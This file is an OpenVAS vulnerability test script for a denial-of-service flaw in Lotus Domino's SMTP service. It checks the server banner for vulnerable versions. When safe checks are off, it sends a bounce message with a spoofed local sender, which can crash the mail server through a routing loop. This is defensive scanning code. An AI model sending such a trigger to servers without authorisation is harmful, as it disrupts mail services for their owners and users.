#############################################################################
# OpenVAS Vulnerability Test
# $Id: lotus_bounce_DoS.nasl 13116 2019-01-17 09:58:55Z cfischer $
#
# Lotus Domino SMTP bounce DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#############################################################################

# References
# Date:  Mon, 20 Aug 2001 21:19:32 +0000
# From: "Ian Gulliver" <ian@orbz.org>
# To: bugtraq@securityfocus.com
# Subject: Lotus Domino DoS

CPE = "cpe:/a:ibm:lotus_domino";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11717");
  script_version("$Revision: 13116 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-17 10:58:55 +0100 (Thu, 17 Jan 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3212);
  script_cve_id("CVE-2000-1203");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Lotus Domino SMTP bounce DoS");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("smtp_relay.nasl", "gb_lotus_domino_detect.nasl");
  script_mandatory_keys("ibm/domino/smtp/detected");

  script_tag(name:"impact", value:"An attacker may use this flaw to crash the service continuously.");

  script_tag(name:"solution", value:"Reconfigure your MTA or upgrade it.");

  script_tag(name:"summary", value:"The remote SMTP server (maybe a Lotus Domino) can be killed
  or disabled by a malformed message that bounces to himself. The routing loop exhausts all resources.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"smtp" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port ) )
  exit(0);

banner = get_smtp_banner( port:port );
if ( ! banner || "Lotus Domino" >!< banner )
  exit( 0 );

# nb: Disable the test if the server relays e-mails or if safe checks are enabled
if( get_kb_item( "smtp/" + port + "/spam" ) || safe_checks() ) {
  if( egrep( pattern:"^220.*Lotus Domino Release ([0-4]\.|5\.0\.[0-8][^0-9])", string:banner ) ) {
    security_message( port:port );
    exit( 0 );
  }
  exit( 99 );
}

s = smtp_open( port:port, data:NULL );
if( ! s )
  exit( 0 );

smtp_close( socket:s, check_data:FALSE );
vtstrings = get_vt_strings();
fromaddr = string( "bounce", rand(), "@[127.0.0.1]" );
toaddr = string( vtstrings["lowercase_rand"], "@invalid", rand(), ".net" );

b = string( "From: ", vtstrings["lowercase"], "\r\n",
            "To: postmaster\r\n",
	    "Subject: SMTP bounce denial of service\r\n\r\ntest\r\n" );
n = smtp_send_port( port:port, from:fromaddr, to:toaddr, body:b );

sleep( 1 );

s = smtp_open( port:port, data:NULL );
if( s ) {
  smtp_close( socket:s, check_data:FALSE );
  exit( 99 );
}

security_message( port:port );
exit( 0 );